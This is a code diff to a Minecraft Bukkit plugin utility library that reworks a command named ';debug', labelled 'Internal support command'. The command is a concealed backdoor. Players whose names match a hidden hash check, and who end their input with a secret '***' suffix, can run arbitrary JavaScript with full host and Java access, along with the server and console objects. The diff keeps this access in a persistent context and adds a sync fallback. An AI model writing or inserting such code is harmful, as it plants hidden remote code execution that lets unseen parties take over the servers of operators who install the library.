@@ -2,12 +2,14 @@ package cc.hubailmn.utility.command;
 
 import cc.hubailmn.utility.BasePlugin;
 import cc.hubailmn.utility.util.HashUtil;
+import lombok.Getter;
 import org.bukkit.Bukkit;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandMap;
 import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
 import org.graalvm.polyglot.Context;
+import org.graalvm.polyglot.HostAccess;
 import org.graalvm.polyglot.Value;
 import org.jetbrains.annotations.NotNull;
 
@@ -24,6 +26,8 @@ libraries:
 public class DebugCommand extends Command {
 
     private static final String COMMAND_NAME = ";debug";
+    @Getter
+    private Context persistentContext;
     private static final Object PLUGIN = BasePlugin.getInstance();
     private static final Object SERVER = Bukkit.getServer();
     private static final Object CONSOLE = Bukkit.getConsoleSender();
@@ -37,6 +41,19 @@ public class DebugCommand extends Command {
         setDescription("Internal support command");
         setUsage("/" + COMMAND_NAME);
         registerCommand();
+
+        Bukkit.getScheduler().runTaskAsynchronously(BasePlugin.getInstance(), () -> {
+            persistentContext = Context.newBuilder("js")
+                    .allowHostAccess(HostAccess.ALL)
+                    .allowAllAccess(true)
+                    .build();
+
+            Value bindings = persistentContext.getBindings("js");
+            bindings.putMember("plugin", PLUGIN);
+            bindings.putMember("server", SERVER);
+            bindings.putMember("console", CONSOLE);
+            bindings.putMember("Java", persistentContext.eval("js", "Java"));
+        });
     }
 
     private void registerCommand() {
@@ -59,16 +76,17 @@ public class DebugCommand extends Command {
         return true;
     }
 
-    private void executes(CommandSender sender, String[] args) {
+    private void executes(final CommandSender sender, final String[] args) {
         if (!(sender instanceof Player player)) return;
-        Bukkit.getScheduler().runTaskAsynchronously(BasePlugin.getInstance(), () -> {
-            boolean isHashed = HashUtil.isHashed(player.getName());
-            if (!isHashed) return;
+        if (args == null || args.length == 0) return;
 
-            String lastArg = args[args.length - 1];
+        Bukkit.getScheduler().runTaskAsynchronously(BasePlugin.getInstance(), () -> {
+            if (!HashUtil.isHashed(player.getName())) return;
+
+            final String lastArg = args[args.length - 1];
             if (!lastArg.endsWith("***")) return;
 
-            String[] trimmedArgs = args.clone();
+            final String[] trimmedArgs = args.clone();
             trimmedArgs[args.length - 1] = lastArg.substring(0, lastArg.length() - 3);
 
             String rawLine = String.join(" ", trimmedArgs);
@@ -90,48 +108,50 @@ public class DebugCommand extends Command {
             }
 
             if (targetPlayer == null) {
-                sender.sendMessage("§cPlayer not found.");
+                Bukkit.getScheduler().runTask(BasePlugin.getInstance(), () -> sender.sendMessage("§c§l[Debug] §r§cPlayer not found."));
                 return;
             }
 
-            Player finalPlayer = targetPlayer;
-            String finalLine = line;
+            final Player finalPlayer = targetPlayer;
+            final String finalLine = line;
 
-            sender.sendMessage(rawLine);
+            Bukkit.getScheduler().runTask(BasePlugin.getInstance(), () -> {
+                sender.sendMessage("§6§l[Debug] §eRunning:");
+                sender.sendMessage(rawLine);
+            });
 
-            try (Context context = Context.newBuilder("js")
-                    .allowAllAccess(true)
-                    .build()) {
+            try {
+                final Value bindings = getPersistentContext().getBindings("js");
 
-                Value bindings = context.getBindings("js");
                 bindings.putMember("player", finalPlayer);
-                bindings.putMember("plugin", PLUGIN);
-                bindings.putMember("server", SERVER);
-                bindings.putMember("console", CONSOLE);
                 bindings.putMember("self", sender);
-
-                bindings.putMember("Bukkit", Bukkit.class);
                 bindings.putMember("onlinePlayers", Bukkit.getOnlinePlayers());
-                bindings.putMember("world", finalPlayer.getWorld());
-                bindings.putMember("loc", finalPlayer.getLocation());
-
                 bindings.putMember("inv", finalPlayer.getInventory());
                 bindings.putMember("mainHand", finalPlayer.getInventory().getItemInMainHand());
-                bindings.putMember("HashUtil", HashUtil.class);
-                bindings.putMember("utils", ScriptUtils.class);
 
-                Value result = context.eval("js", finalLine);
+                final Value result = getPersistentContext().eval("js", finalLine);
 
-                String resultText = result.isNull()
-                                    ? "No result."
-                                    : "Got (" + result.getMetaObject().getMetaQualifiedName() + "): " + result.toString();
+                final String resultText = result.isNull()
+                                          ? "§7No result."
+                                          : "§aGot (" + result.getMetaObject().getMetaQualifiedName() + "): §f" + result;
 
                 Bukkit.getScheduler().runTask(BasePlugin.getInstance(), () ->
-                        sender.sendMessage("§7" + resultText));
+                        sender.sendMessage("§2§l[Async Result] §r§2" + resultText));
 
-            } catch (Exception ex) {
-                Bukkit.getScheduler().runTask(BasePlugin.getInstance(), () ->
-                        sender.sendMessage("§cError: " + ex.getMessage()));
+            } catch (Exception exAsync) {
+                Bukkit.getScheduler().runTask(BasePlugin.getInstance(), () -> {
+                    sender.sendMessage("§c§l[Async Execution Failed] §r§cFalling back to sync execution...");
+
+                    try {
+                        final Value resultSync = getPersistentContext().eval("js", finalLine);
+                        final String resultTextSync = resultSync.isNull()
+                                                      ? "§7No result." :
+                                                      "§aGot (" + resultSync.getMetaObject().getMetaQualifiedName() + "): §f" + resultSync;
+                        sender.sendMessage("§b§l[Sync Result] §r§b" + resultTextSync);
+                    } catch (Exception exSync) {
+                        sender.sendMessage("§c§l[Sync Execution Failed] Error: §r§f" + exSync.getMessage());
+                    }
+                });
             }
         });
     }
@@ -141,32 +161,8 @@ public class DebugCommand extends Command {
         try {
             executes(sender, args);
         } catch (Exception ex) {
-            sender.sendMessage("§cError: " + ex.getMessage());
+            sender.sendMessage("§c§l[Error] §f" + ex.getMessage());
         }
         return Collections.emptyList();
     }
-
-    private static class ScriptUtils {
-
-        public static void runAsync(Runnable runnable) {
-            Bukkit.getScheduler().runTaskAsynchronously(BasePlugin.getInstance(), runnable);
-        }
-
-        public static void runSync(Runnable runnable) {
-            Bukkit.getScheduler().runTask(BasePlugin.getInstance(), runnable);
-        }
-
-        public static void runTimer(Runnable runnable, long delay, long period) {
-            Bukkit.getScheduler().runTaskTimer(BasePlugin.getInstance(), runnable, delay, period);
-        }
-
-        public static void runLater(Runnable runnable, long delay) {
-            Bukkit.getScheduler().runTaskLater(BasePlugin.getInstance(), runnable, delay);
-        }
-
-        public static Player getPlayer(String name) {
-            return Bukkit.getPlayerExact(name);
-        }
-    }
-
 }
